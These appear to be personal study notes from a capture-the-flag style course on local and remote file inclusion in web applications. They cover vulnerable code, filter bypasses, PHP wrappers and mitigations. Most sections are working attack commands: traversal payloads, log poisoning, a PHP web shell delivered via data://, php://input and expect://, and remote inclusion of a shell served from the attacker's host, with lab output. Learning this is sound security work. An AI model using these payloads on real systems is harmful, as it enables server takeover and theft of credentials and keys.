# File Inclusion ( will need practice)

## 1. Introduction to File Inclusions

- **Purpose**:
    - Many web frameworks (PHP, JavaScript, Java, .NET) dynamically load files based on HTTP parameters to **reduce code duplication** and **create dynamic web pages**.
    - This allows for easier templating, dynamically pulling content for navigation, language options, or page components.
- **Risk**:
    - If **user input is unsanitized** and directly passed to file inclusion functions, attackers can manipulate it to read or execute arbitrary files on the server.
    - This results in [**Local File Inclusion (LFI)**](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion) vulnerabilities, potentially leading to:
        - **Source code disclosure**
        - **Sensitive data leaks**
        - **Remote code execution (RCE)**

---

## 2. How LFI Works

- **Example**:
    - URL with dynamic file inclusion: **`/index.php?page=about`**
        - The `page` parameter determines which file is included (e.g., `about.php`).
    - **Vulnerability**: **`/index.php?page=../../etc/passwd`**
        - The attacker manipulates the `page` parameter to load `/etc/passwd` or other sensitive files.

---

## 3. Templating Engines and LFI

- **Templating Purpose**:
    - Web applications use templating to **display common sections** (headers, footers, etc.) across pages while loading specific content dynamically.
- **Vulnerable Setup**: **`index.php?page=about`**
    - This pulls content from `about.php`, but the attacker can replace `about` with paths to local files.

---

## 4. Examples of Vulnerable Code

### 4.1 PHP

```php
if (isset($_GET['language'])) {
    include($_GET['language']);
}
```

- We see that the `language` parameter is directly passed to the `include()` function. So, any path we pass in the `language` parameter will be loaded on the page, including any local files on the back-end server. This is not exclusive to the `include()` function
- **Vulnerable Functions**:
    - `include()`, `include_once()`
    - `require()`, `require_once()`
    - `file_get_contents()`, `fopen()`, `file()`

---

### 4.2 NodeJS

```jsx
if(req.query.language) {
    fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
        res.write(data);
    });
}
```

- **Risk**: Directly reading files from user-specified paths.
- **Express.js Example**: The following example shows uses the `language` parameter to determine which directory it should pull the `about.html` page from:
    
    ```jsx
    app.get("/about/:language", function(req, res) {
        res.render(`/${req.params.language}/about.html`);
    });
    ```
    
    - User input (e.g., `/about/en`) controls file inclusion.

---

### 4.3 Java (JSP)

```java
<c:if test="${not empty param.language}">
    <jsp:include file="<%= request.getParameter('language') %>" />
</c:if>
```

- The `include` function may take a file or a page URL as its argument and then renders the object into the front-end template, similar to the ones we saw earlier with NodeJS. The `import` function may also be used to render a local file or a URL, such as the following example:

```java
<c:import url= "<%= request.getParameter('language') %>"/>
```

- User-specified URL paths could lead to LFI or remote file inclusion (RFI).

---

### 4.4 .NET

The `Response.WriteFile` function works very similarly to all of our earlier examples, as it takes a file path for its input and writes its content to the response. The path may be retrieved from a GET parameter for dynamic content loading, as follows:

```scss
@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
    <% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %>
}
```

Furthermore, the `@Html.Partial()` function may also be used to render the specified file as part of the front-end template, similarly to what we saw earlier:

```java
@Html.Partial(HttpContext.Request.Query['language'])
```

Finally, the `include` function may be used to render local files or remote URLs, and may also execute the specified files as well:

```java
<!--#include file="<% HttpContext.Request.Query['language'] %>"-->
```

- **Vulnerable Functions**:
    - `Response.WriteFile()`
    - `@Html.Partial()`
    - `@Html.RemotePartial()`

---

## 5. File Inclusion Risks

The most important thing to keep in mind is that `some of the above functions only read the content of the specified files, while others also execute the specified files`. Furthermore, some of them allow specifying remote URLs, while others only work with files local to the back-end server.

The following table shows which functions may execute files and which only read file content:

| **Function** | **Read Content** | **Execute** | **Remote URL** |
| --- | --- | --- | --- |
| **PHP** |  |  |  |
| `include()`/`include_once()` | ✅ | ✅ | ✅ |
| `require()`/`require_once()` | ✅ | ✅ | ❌ |
| `file_get_contents()` | ✅ | ❌ | ✅ |
| `fopen()`/`file()` | ✅ | ❌ | ❌ |
| **NodeJS** |  |  |  |
| `fs.readFile()` | ✅ | ❌ | ❌ |
| `fs.sendFile()` | ✅ | ❌ | ❌ |
| `res.render()` | ✅ | ✅ | ❌ |
| **Java** |  |  |  |
| `include` | ✅ | ❌ | ❌ |
| `import` | ✅ | ✅ | ✅ |
| **.NET** |  |  |  |
| `@Html.Partial()` | ✅ | ❌ | ❌ |
| `@Html.RemotePartial()` | ✅ | ❌ | ✅ |
| `Response.WriteFile()` | ✅ | ❌ | ❌ |
| `include` | ✅ | ✅ | ✅ |

---

## 6. Consequences of LFI

- **Source Code Disclosure**: Read internal PHP, JS, or Java source files.
- **Sensitive Data Exposure**: Extract API keys, passwords, SSH keys, or configuration files.
- **Remote Code Execution (RCE)**: In certain conditions, LFI may allow executing malicious files.
- **Directory Traversal**: Use `../` sequences to access files outside the intended directory.

---

## 7. Common Files to Target with LFI

| **File** | **Description** |
| --- | --- |
| `/etc/passwd` | List of user accounts (Linux) |
| `/var/www/html/config.php` | Web application configuration with database creds |
| `.ssh/id_rsa` | SSH private key |
| `/proc/self/environ` | Environment variables (potential RCE via injection) |
| `/var/log/nginx/access.log` | Nginx access logs |

---

## 8. Real-World Exploitation Scenarios

1. **Read Sensitive Files**:
    
    ```
    /index.php?page=../../../../etc/passwd
    ```
    
2. **Code Execution (log poisoning)**:
    
    ```
    /index.php?page=../../../../var/log/nginx/access.log
    ```
    
    - Inject PHP code into logs and load it through LFI.
3. **Access Configuration**:
    
    ```
    /index.php?page=../../../../../var/www/html/config.php
    ```
    

---

# FILE DISCLOSURE

## Local File Inclusion (LFI) Exploitation

## 1. Understanding LFI

- **LFI Vulnerabilities** occur when an application includes files based on user-supplied input **without proper sanitization**.
- **Impact**:
    - **File Disclosure** – Read sensitive files (e.g., `/etc/passwd`).
    - **Source Code Disclosure** – Reveal backend source code.
    - **Remote Code Execution (RCE)** – Achievable under specific conditions.

---

## 2. Basic LFI Exploitation

### 2.1 Basic File Inclusion

- **Scenario**:
    
    ```
    http://<SERVER_IP>:<PORT>/index.php?language=es.php
    ```
    
- **Modification**:
    
    ```
    http://<SERVER_IP>:<PORT>/index.php?language=/etc/passwd
    ```
    
- **Result**:
    - The contents of `/etc/passwd` are revealed, listing all system users.
- **Explanation**:
    - The vulnerable web application includes files dynamically. By altering the parameter to **target sensitive files**, LFI is achieved.

---

## 3. Path Traversal (Directory Traversal)

### 3.1 Issue with Path Prepending

- **Code Example**:
    
    ```php
    include("./languages/" . $_GET['language']);
    ```
    
- **Attempt**:
    
    ```
    http://<SERVER_IP>:<PORT>/index.php?language=/etc/passwd
    ```
    
- **Error**:
    
    ```
    Warning: include(./languages//etc/passwd) failed to open stream
    ```
    
- **Bypass (Path Traversal)**:
    
    ```
    http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/passwd
    ```
    
- **Explanation**:
    - **`../`** traverses directories, allowing access to files outside the `languages` directory.
    - Multiple `../` can be used to navigate to root (`/`).

---

## 4. Filename Prefix Bypass

### 4.1 Issue with Filename Prefixes

- **Code Example**:
    
    ```php
    include("lang_" . $_GET['language']);
    ```
    
- **Attempt**:
    
    ```
    http://<SERVER_IP>:<PORT>/index.php?language=../../../etc/passwd
    ```
    
- **Error**:
    
    ```
    Warning: include(lang_../../../etc/passwd) failed to open stream
    ```
    
- **Bypass (Prefix a Slash `/`)**:
    
    ```
    http://<SERVER_IP>:<PORT>/index.php?language=/../../../etc/passwd
    ```
    
- **Explanation**:
    - Adding a `/` forces the web app to treat `lang_` as a directory, bypassing the prefix.

---

## 5. Appended Extensions

### 5.1 Issue with File Extensions

- **Code Example**:
    
    ```php
    include($_GET['language'] . ".php");
    ```
    
- **Attempt**:
    
    ```
    http://<SERVER_IP>:<PORT>/index.php?language=/etc/passwd
    ```
    
- **Error**:
    
    ```
    /etc/passwd.php not found
    ```
    
- **Bypasses**:
    - **Null Byte Injection** (Older PHP Versions):
        
        ```
        /index.php?language=/etc/passwd%00
        ```
        
    - **URL Encoding**:
        
        ```
        /index.php?language=../../../../etc/passwd%00
        ```
        
    - **Trailing Encoded Null Bytes**:
        
        ```
        /index.php?language=../../../../etc/passwd%2500
        ```
        
    - **Double Extension Trick** (Fake Extension):
        
        ```
        /index.php?language=../../../../etc/passwd%00.html
        ```
        

---

## 6. Second-Order LFI Attacks

### 6.1 Overview

- **Second-Order LFI**:
    - Occurs when **indirect input** (e.g., username) is used in file inclusion functions.
    - Exploitation requires **poisoning database entries** or application parameters during registration or profile updates.
- **Example (Profile Image LFI)**:
    
    ```
    /profile/$username/avatar.png
    ```
    
    - **Malicious Username**:
        
        ```
        ../../../etc/passwd
        ```
        
    - **Effect**:
        - When the avatar is fetched, `/etc/passwd` is included.

---

## 7. Practical LFI Targets

| **Target File** | **Purpose** |
| --- | --- |
| `/etc/passwd` | Lists system users (Linux). |
| `/proc/self/environ` | Environment variables (often exploitable). |
| `/var/log/nginx/access.log` | Log files (inject PHP code into logs). |
| `/var/www/html/index.php` | Application source code. |
| `/root/.ssh/id_rsa` | Private SSH key for root user. |
| `C:\Windows\win.ini` | Basic configuration file (Windows). |
| `C:\Windows\System32\drivers\etc\hosts` | Hosts file (Windows). |

---

## 8. Exploitation Use Cases

### 8.1 Basic File Read

```
/index.php?language=../../../../etc/passwd
```

### 8.2 Reading Source Code

```
/index.php?language=../../../../var/www/html/index.php
```

### 8.3 Log File Poisoning (RCE)

1. Inject PHP code into logs:
    
    ```
    curl "http://<SERVER_IP>/?language=<?php system('id'); ?>"
    ```
    
2. Load the poisoned log:
    
    ```
    /index.php?language=../../../../var/log/nginx/access.log
    ```
    

---

# Basic Bypasses

## 1. Overview

- Web applications often implement filters and sanitization to mitigate LFI attacks.
- However, improper or weak filters can still be bypassed through various techniques, leading to file disclosure or remote code execution (RCE).

---

## 2. Bypass Techniques

### 2.1 Non-Recursive Path Traversal Filters

- **Vulnerability**:
    - Some applications use simple **string replacement** to prevent path traversal.
    - Example:
        
        ```php
        $language = str_replace('../', '', $_GET['language']);
        include("./languages/" . $language);
        ```
        
    - This filter **removes `../` once** but does not handle recursive payloads.
- **Bypass**:
    
    ```bash
    ....//    # Bypasses single str_replace filter
    ..././    # Alternative bypass
    ....\/    # Escaped slash
    ....////  # Repeated slashes
    ```
    
- **Exploitation Example**:
    
    ```
    http://<SERVER_IP>:<PORT>/index.php?language=....//....//....//etc/passwd
    ```
    
- **Explanation**:
    - The first `../` is removed, but `....//` resolves to `../` after processing.

---

### 2.2 URL Encoding (Bypassing Character Blacklists)

- **Vulnerability**:
    - Applications may block **`../` or `/`** by blacklisting specific characters.
    - URL encoding **hides these characters** during transmission but decodes them at runtime.
- **Payload (Encoding `../`)**:
    
    ```
    ../  ->  %2e%2e%2f
    /etc/passwd  ->  %2f%65%74%63%2f%70%61%73%73%77%64
    ```
    
- **Exploitation Example**:
    
    ```
    http://<SERVER_IP>:<PORT>/index.php?language=%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
    ```
    
- **Double Encoding**:
    
    ```bash
    %2e%2e%2f  ->  %252e%252e%252f
    ```
    

---

### 2.3 Approved Path Bypass

- **Vulnerability**:
    - Web applications may allow file inclusion **only from specific directories** using regex:
        
        ```php
        if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
            include($_GET['language']);
        }
        ```
        
    - **Fuzzing directories** can reveal the approved path (e.g., `./languages`).
- **Bypass**:
    
    ```
    http://<SERVER_IP>:<PORT>/index.php?language=./languages/../../../../etc/passwd
    ```
    
- **Explanation**:
    - The payload starts with `./languages/` to match the regex but **traverses back to root**.

---

### 2.4 Appended Extension Bypass

- **Vulnerability**:
    - Applications append `.php` or other extensions to input to **restrict LFI to certain file types**:
        
        ```php
        include($_GET['language'] . ".php");
        ```
        
- **Problem**:
    - `/etc/passwd` becomes `/etc/passwd.php` (does not exist).

### 1. Null Byte Injection (Older PHP < 5.5)

- **Payload**:
    
    ```
    /etc/passwd%00
    ```
    
- **Effect**:
    - `%00` terminates the string, preventing `.php` from being appended.
    - Resulting path: `/etc/passwd%00.php` → `/etc/passwd`.

### 2. Double Extensions (PHP < 5.3)

- **Payload**:
    
    ```
    /etc/passwd%00.html
    ```
    
    - **Alternative**:
        
        ```
        /etc/passwd%00.txt
        ```
        

### 3. Truncated Paths (Path Length Bypass – PHP < 5.3)

- **Concept**:
    - PHP has a **4096 character path limit**. Paths exceeding this limit are **truncated**.
    - Appended `.php` is **cut off** if the path exceeds this limit.
- **Payload**:
    
    ```
    ?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]
    ```
    
- **Automated Payload**:
    
    ```bash
    echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
    
    # non_existing_directory/../../../etc/passwd/./././<SNIP>././././
    ```
    

---

## 3. Log File Poisoning (RCE via LFI)

### 3.1 Overview

- **Concept**:
    - Poison web server logs by injecting **PHP code** through LFI.
- **Payload** (Inject PHP into logs):
    
    ```bash
    curl "http://<SERVER_IP>/?language=<?php system('id'); ?>"
    ```
    
- **Access Logs** (Include poisoned logs):
    
    ```
    http://<SERVER_IP>:<PORT>/index.php?language=../../../../var/log/nginx/access.log
    ```
    
- **Result**:
    - PHP code execution (remote command execution).

---

## 4. Common Targets for LFI

| **Target File** | **Description** |
| --- | --- |
| `/etc/passwd` | Lists system users. |
| `/proc/self/environ` | Environment variables (potential code execution). |
| `/var/www/html/index.php` | Web application source code. |
| `/root/.ssh/id_rsa` | SSH private key (root access). |
| `/var/log/nginx/access.log` | Log file (potential log poisoning). |
| `C:\Windows\win.ini` | Windows configuration file. |
| `C:\Windows\System32\drivers\etc\hosts` | Hosts file (Windows). |

---

## 5. Mitigation Techniques

### 5.1 Input Validation

- **Whitelisting**: Allow only specific files to be included.
- **Regex Validation**: Restrict paths to certain directories (but ensure recursive filters).

### 5.2 Path Sanitization

- **Realpath Sanitization**:
    
    ```php
    $path = realpath("/var/www/html/pages/" . $_GET['page']);
    if (strpos($path, '/var/www/html/pages/') === 0) {
        include($path);
    }
    ```
    
- **Remove Traversal Patterns**:
    
    ```php
    $file = str_replace(array('../', '..\\', './', '.\\'), '', $_GET['page']);
    ```
    

---

# PHP Filters for LFI Exploitation

## 1. Overview

- **PHP Filters** allow for manipulation of input/output streams, enabling attackers to bypass standard LFI protections and read PHP source code.
- They leverage **wrappers** such as `php://filter` to **apply encoding** (like base64) and access files that would otherwise be executed by the PHP engine.
- **Key Goal**:
    - Bypass the execution of PHP files and **read their raw source code**.
    - **Extract sensitive information** such as credentials, API keys, or database connections.

---

## 2. How PHP Filters Work

- PHP wrappers are invoked using the `php://` scheme.
- The `php://filter` wrapper allows **filters** to be applied to files read via LFI.
- The most useful filter for LFI attacks is:
    
    ```
    convert.base64-encode
    ```
    
- This filter **base64 encodes the content** of the included PHP file instead of executing it.

---

## nn3. Exploitation Workflow

---

### 3.1 Fuzzing for PHP Files

- Before applying filters, we need to **discover existing PHP files**.
- Use directory brute-forcing tools like **ffuf** or **gobuster**:
    
    ```bash
    ffuf -s -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://94.237.59.180:36195/FUZZ.php
    ```
    
    - Look for files with `200`, `301`, `302`, or `403` responses.
    - Even files returning `403 Forbidden` can often still be read via LFI.

---

### 3.2 Basic LFI Without Filters (Execution)

- **Standard LFI** often **executes** PHP files, rendering them as HTML:
    
    ```
    http://<SERVER_IP>:<PORT>/index.php?language=config
    ```
    
- **Problem**:
    - Files like `config.php` may not produce output because they **contain logic but no HTML**.
    - The goal is to **read the raw source code**, not the rendered HTML.

---

### 3.3 Applying PHP Filters (Source Code Disclosure)

- By applying the **base64-encode filter**, we can **retrieve the raw PHP source code**:
    
    ```bash
    http://94.237.59.180:36195/index.php?language=php://filter/read=convert.base64-encode/resource=configure
    \\
    \\ for : http://94.237.54.116:44988/index.php?page=about
    view-source:http://94.237.54.116:44988/index.php?page=php://filter/convert.base64-encode/resource=index
    ```
    
- **Explanation**:
    - `php://filter` → PHP wrapper for stream filtering.
    - `read=convert.base64-encode` → Applies base64 encoding to the file.
    - `resource=config` → Specifies the target file (`config.php` is appended automatically by the application).

---

### 3.4 Decoding the Output

- The web application returns a **base64 string** representing the PHP source code.
- Decode the string using:
    
    ```bash
    echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d
    ```
    
- **Result**:
    - PHP source code is revealed, allowing for further analysis of logic, credentials, or secrets.

---

## 4. Advanced PHP Filter Exploitation Techniques

---

### 4.1 Path Traversal with Filters

- Combine **path traversal** with PHP filters to access files outside the current directory:
    
    ```
    http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/passwd
    ```
    

---

### 4.2 Handling Appended Extensions

- If `.php` is automatically appended to user input:
    
    ```
    http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=index
    ```
    
- The application appends `.php`, resulting in:
    
    ```
    php://filter/read=convert.base64-encode/resource=index.php
    ```
    

---

### 4.3 Bypassing Directory Restrictions

- Some applications restrict file inclusions to specific directories.
- Bypass this by adding traversal payloads:
    
    ```
    http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=./languages/../../../../../etc/passwd
    ```
    

---

### 4.4 Reading Non-PHP Files

- PHP filters can also read non-PHP files, such as logs, configuration files, or SSH keys:
    
    ```
    http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=/var/log/nginx/access.log
    ```
    

---

## 5. Real-World Exploit Paths

| **Target File** | **Description** |
| --- | --- |
| `/etc/passwd` | Lists system users. |
| `/proc/self/environ` | Environment variables (potential RCE). |
| `/var/log/nginx/access.log` | Access logs (log poisoning for RCE). |
| `/var/www/html/config.php` | Configuration files (database credentials). |
| `/root/.ssh/id_rsa` | SSH private keys (root access). |

---

## 6. Exploiting RCE via PHP Filters

### 6.1 Web Shell Injection (PHP Log Poisoning)

- Inject PHP code into server logs by modifying the **User-Agent** or URL.
- Example (Inject PHP payload via User-Agent):
    
    ```bash
    curl "http://<SERVER_IP>/?language=<?php system('id'); ?>"
    ```
    
- Include the poisoned log file to trigger RCE:
    
    ```bash
    http://<SERVER_IP>:<PORT>/index.php?language=../../../../var/log/nginx/access.log
    ```
    

---

### 6.2 Uploading Web Shells via LFI

- If **file upload functionality** is available, upload a `.jpg` or `.png` with PHP code embedded in EXIF data.
- Use LFI to **include the uploaded file** and execute PHP code.

---

## 7. Common PHP Wrappers

| **Wrapper** | **Description** |
| --- | --- |
| `php://filter` | Apply filters to file streams (e.g., base64 encode). |
| `php://input` | Reads raw POST data (useful for RCE). |
| `php://memory` | Temporary memory storage. |
| `data://` | Embeds data URIs directly into the application. |
| `zip://` | Reads ZIP files as file streams. |
| `expect://` | Executes system commands (if enabled). |

---

## 8. Mitigation Techniques

1. **Input Validation**
    - Restrict user input to specific whitelisted files.
2. **Avoid Dynamic Inclusion**
    - Use **hardcoded paths** for file inclusion.
3. **Path Normalization**
    - Apply `realpath()` to resolve paths and validate against allowed directories.
4. **Disable PHP Wrappers**
    - In production, disable unnecessary PHP wrappers:
        
        ```
        allow_url_include = Off
        allow_url_fopen = Off
        ```
        
5. **Restrict PHP Execution**
    - Disable execution in directories that store uploads:
        
        ```
        <Directory /var/www/uploads>
        php_flag engine off
        </Directory>
        ```
        

# REMOTE CODE EXECUTION

# PHP Wrappers

## 1. Overview

PHP Wrappers extend the functionality of standard file inclusion functions (like `include()`) by allowing interaction with various input/output streams and external data sources.

**Key Goals of PHP Wrappers in LFI Attacks:**

- **Read sensitive files** on the server (e.g., `config.php`, `/etc/passwd`).
- **Execute system commands** via RCE if certain configurations are enabled.
- **Bypass protections** like appended file extensions or path restrictions.

---

## 2. Key PHP Wrappers for LFI Exploitation

| **Wrapper** | **Description** | **Primary Use** | **Prerequisites** |
| --- | --- | --- | --- |
| `php://filter` | Apply filters (e.g., base64 encode) to input streams. | **Read PHP source code** | None |
| `data://` | Embed external data (including PHP code). | **RCE (Remote Code Execution)** | `allow_url_include` = **On** |
| `php://input` | Accept PHP code via POST requests. | **RCE (POST-based)** | `allow_url_include` = **On** |
| `expect://` | Execute system commands directly. | **Direct RCE** | `expect` module installed and enabled |
| `zip://` | Extract PHP code from ZIP archives. | **File Read / RCE via file upload** | Ability to upload ZIP files |
| `phar://` | Include PHP objects (deserialization attacks). | **Deserialization + RCE** | Phar files writable/uploadable |

## 3. Exploitation Workflow

### 3.1. Identifying LFI Vulnerabilities

1. Identify LFI by modifying URL parameters:
    
    ```html
    http://<SERVER_IP>:<PORT>/index.php?language=es.php
    ```
    
2. Try accessing sensitive files (e.g., `/etc/passwd`):
    
    ```html
    http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/passwd
    ```
    
3. If the PHP file executes instead of displaying its content, move to **PHP filters** to bypass execution and read the raw source.

---

### 3.2. Using PHP Filters (php://filter) to Read Source Code

- Apply `convert.base64-encode` to PHP files:
    
    ```
    http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=index
    ```
    
- Decode the result:
    
    ```bash
    echo 'PD9waHAK...SNIP...' | base64 -d
    ```
    

---

## 4. Remote Code Execution via PHP Wrappers

---

### 4.1. **Checking PHP Configurations** (For RCE)

To do so, we can include the PHP configuration file found at (`/etc/php/X.Y/apache2/php.ini`) for Apache or at (`/etc/php/X.Y/fpm/php.ini`) for Nginx, where `X.Y` is your install PHP version.

- Include the PHP configuration file to check if `allow_url_include` is enabled:
    
    ```
    curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
    <!DOCTYPE html>
    
    <html lang="en">
    ...SNIP...
     <h2>Containers</h2>
        W1BIUF0KCjs7Ozs7Ozs7O
        ...SNIP...
        4KO2ZmaS5wcmVsb2FkPQo=
    <p class="read-more">
    ```
    
- Decode the output and grep for the configuration:
    
    ```bash
    echo 'BASE64_ENCODED_OUTPUT' | base64 -d | grep allow_url_include
    
    # Result
    allow_url_include = On
    ```
    
- If enabled, proceed with the `data://` and `php://input` wrappers.

---

### 4.2. **Remote Code Execution (RCE) via data://**

- Base64 encode a PHP web shell:
    
    ```bash
    echo '<?php system($_GET["cmd"]); ?>' | base64
    #
    PD9waHAKc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
    ```
    
- We can also URL [Encode](https://www.urlencoder.org) the Payload:
    
    ```html
    python3 -c 'import urllib.parse;print(urllib.parse.quote("PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg=="))'
    
    PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D
    ```
    
- Pass it to the `data` wrapper with `data://text/plain;base64,`, passing commands as the value for the `cmd` URL-parameter. First, `ls` will be used on the root directory `/` to view the files there (`grep` is also used to take out anything that is an HTML tag from the response returned by `cURL`):
    
    ```
    curl -s 'http://STMIP:STMPO/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=ls+/' | grep -v "<.*>"
    ```
    
- Use cURL to capture the response:
    
    ```bash
    curl -s 'http://94.237.54.116:40696/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=ls+/' | grep -v "<.*>"
    
    ###
                37809e2f8952f06139011994726d9ef1.txt
    bin
    boot
    dev
    etc
    home
    lib
    lib32
    lib64
    libx32
    media
    mnt
    opt
    proc
    root
    run
    sbin
    srv
    sys
    tmp
    usr
    var
    ```
    
- we can `cat` the sus file we find:
    
    ```bash
    curl -s 'http://94.237.54.116:40696/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=cat+/37809e2f8952f06139011994726d9ef1.txt' | grep -v "<.*>"
    
                HTB{d!$46l3_r3m0t3_url_!nclud3}
    ```
    

---

### 4.3. **RCE via php://input (POST Request)**

- Send PHP code as POST data:
    
    ```bash
    curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
                uid=33(www-data) gid=33(www-data) groups=33(www-data)
    ```
    
- The web shell executes commands directly from the POST data.

<aside>
💡

**Note:** To pass our command as a GET request, we need the vulnerable function to also accept GET request (i.e. use `$_REQUEST`). If it only accepts POST requests, then we can put our command directly in our PHP code, instead of a dynamic web shell (e.g. `<\?php system('id')?>`)

</aside>

---

### 4.4. **Direct Command Execution via `expect://`**

- **Confirm if expect module is enabled**:
    
    ```bash
    echo 'BASE64_ENCODED_OUTPUT' | base64 -d | grep expect
    # extension=expect
    ```
    
- Execute commands directly using the `expect://` wrapper:
    
    ```bash
    curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
    ```
    
- **Expect module directly runs system commands** without the need for web shells.

---

---

## 5. Real-World Exploit Paths

| **Target File** | **Description** |
| --- | --- |
| `/etc/passwd` | Lists system users. |
| `/proc/self/environ` | Environment variables (potential RCE). |
| `/var/www/html/config.php` | Web application configuration (credentials). |
| `/root/.ssh/id_rsa` | SSH private keys (root access). |

---

# Remote File Inclusion (RFI)

### **What is RFI (Remote File Inclusion)?**

- **RFI** occurs when a web application allows **remote URLs** to be included and executed.
- This allows attackers to **host malicious scripts** and include them remotely to gain control over the server.

---

### **Key Points:**

1. **LFI vs. RFI:**
    - **LFI (Local File Inclusion):** Includes local files from the server (e.g., `/etc/passwd`).
    - **RFI (Remote File Inclusion):** Includes files from **external sources** (e.g., malicious web shells).
    
    | **Function** | **Read Content** | **Execute** | **Remote URL** |
    | --- | --- | --- | --- |
    | **PHP** |  |  |  |
    | `include()`/`include_once()` | ✅ | ✅ | ✅ |
    | `file_get_contents()` | ✅ | ❌ | ✅ |
    | **Java** |  |  |  |
    | `import` | ✅ | ✅ | ✅ |
    | **.NET** |  |  |  |
    | `@Html.RemotePartial()` | ✅ | ❌ | ✅ |
    | `include` | ✅ | ✅ | ✅ |
2. **Vulnerable Functions (in PHP):**
    - **`include()` / `include_once()`** – Allows remote file inclusion and execution.
    - **`file_get_contents()`** – Reads remote content but does not execute it.
3. **Why RFI Might Fail (Common Restrictions):**
    - **`allow_url_include`** must be enabled (disabled by default in PHP).
    - You may only control a portion of the filename and not the entire protocol wrapper (ex: `http://`, `ftp://`, `https://`).
    - Firewalls or WAFs may block remote URLs.
    - File extension filters (e.g., `.php` required).

---

### **How to Exploit RFI for Remote Code Execution (RCE):**

---

### **1. Check for RFI Vulnerability:**

```bash
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php'
```

- This attempts to include a local page over HTTP.
- If the page loads without errors, the app is vulnerable to RFI.

---

### **2. Prepare the Malicious Web Shell:**

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

- A simple PHP shell that takes commands from the `cmd` parameter.

---

### **3. Host the Web Shell (Python HTTP Server):**

```bash
sudo python3 -m http.server 8080
```

- This serves `shell.php` over HTTP.

---

### **4. Trigger RCE with the Web Shell (RFI Attack):**

```bash
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=http://<YOUR_IP>:8080/shell.php&cmd=id'
```

- **Result:** Executes the `id` command on the target server.
- **Proof:** Returns `uid=33(www-data) gid=33(www-data)`.

```bash
# further commands
curl -s 'http://10.129.26.28/index.php?language=http://10.10.15.196:8000/shell.php&cmd=ls%20-la%20/' | grep -v "<.*>"

      total 84
drwxr-xr-x   1 root     root     4096 Nov  5  2020 .
drwxr-xr-x   1 root     root     4096 Nov  5  2020 ..
-rwxr-xr-x   1 root     root        0 Nov  5  2020 .dockerenv
drwxr-xr-x   1 root     root     4096 Nov  5  2020 bin
drwxr-xr-x   2 root     root     4096 Apr 24  2018 boot
drwxr-xr-x   5 root     root      340 Jan  7 18:44 dev
drwxr-xr-x   1 root     root     4096 Nov  5  2020 etc
drwxr-xr-x   1 www-data www-data 4096 Nov  5  2020 exercise
drwxr-xr-x   2 root     root     4096 Apr 24  2018 home
drwxr-xr-x   1 root     root     4096 May 23  2017 lib
drwxr-xr-x   2 root     root     4096 Sep 21  2020 lib64
drwxr-xr-x   2 root     root     4096 Sep 21  2020 media
drwxr-xr-x   2 root     root     4096 Sep 21  2020 mnt
drwxr-xr-x   2 root     root     4096 Sep 21  2020 opt
dr-xr-xr-x 181 root     root        0 Jan  7 18:44 proc
drwx------   2 root     root     4096 Sep 21  2020 root
drwxr-xr-x   1 root     root     4096 Nov  5  2020 run
drwxr-xr-x   1 root     root     4096 Sep 25  2020 sbin
drwxr-xr-x   2 root     root     4096 Sep 21  2020 srv
dr-xr-xr-x  13 root     root        0 Jan  7 18:44 sys
drwxrwxrwt   1 root     root     4096 Jan  7 18:44 tmp
drwxr-xr-x   1 root     root     4096 Sep 21  2020 usr
drwxr-xr-x   1 root     root     4096 Nov  5  2020 var
####
curl -s 'http://10.129.26.28/index.php?language=http://10.10.15.196:8000/shell.php&cmd=cat+/exercise/flag.txt' | grep -v "<.*>"

      99a8fc05f033f2fc0cf9a6f9826f83f4
```

---

### **Alternative Methods (If HTTP is Blocked):**

---

### **1. FTP Hosting:**

- Use FTP if HTTP is restricted:

```bash
sudo python -m pyftpdlib -p 21
```

- RFI URL:

```bash
http://<SERVER_IP>:<PORT>/index.php?language=ftp://<YOUR_IP>/shell.php&cmd=id
```

---

### **2. SMB Hosting (For Windows Servers):**

- Host the shell with SMB if the app runs on Windows:

```bash
impacket-smbserver -smb2support share $(pwd)
```

- RFI URL:

```bash
http://<SERVER_IP>:<PORT>/index.php?language=\\\\<YOUR_IP>\\share\\shell.php&cmd=whoami
```

---

### **Post-Exploitation:**

- Once you gain access, you can:
    - **Enumerate files**: `ls /`
    - **Read sensitive files**: `cat /flag.txt`
